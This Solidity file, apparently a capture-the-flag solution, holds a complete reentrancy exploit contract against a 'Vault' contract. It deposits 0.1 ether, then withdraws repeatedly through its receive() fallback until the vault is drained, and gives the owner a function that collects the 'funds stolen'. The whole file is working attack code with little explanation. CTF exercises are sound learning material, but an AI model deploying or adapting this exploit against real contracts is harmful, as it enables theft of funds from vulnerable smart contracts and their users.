// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/CTF1.sol";

contract CTF1_Attack{
    Vault public CTF1;
    address owner;

    // initializes the CTF1 variable with the deployed vault contract address
    constructor(address _vaultAddress){
        CTF1 = Vault(_vaultAddress);
        owner = msg.sender;
    }

    /// @notice Function to attack the vault cotnract
    function attackVault() public payable{
        // Make sure the attack is being done with enough ether
        require(msg.value >= 0.1 ether);

        // Send ether to the vault so the credit to us updates on their part
        CTF1.deposit{value: 0.1 ether}(address(this));

        // Withdraw the deposited credit so it then goes to the fallback
        CTF1.withdraw(0.1 ether);
    }

    /// @notice withdraw function to get the funds stolen
    function withdraw() public {
        require(msg.sender == owner);
        payable(msg.sender).transfer(address(this).balance);
    }



    /// @notice Where the Vault contract ends up going when depositing the funds
    receive() external payable{
        if (address(CTF1).balance >= 0.1 ether){
            CTF1.withdraw(0.1 ether);
        }
    }
}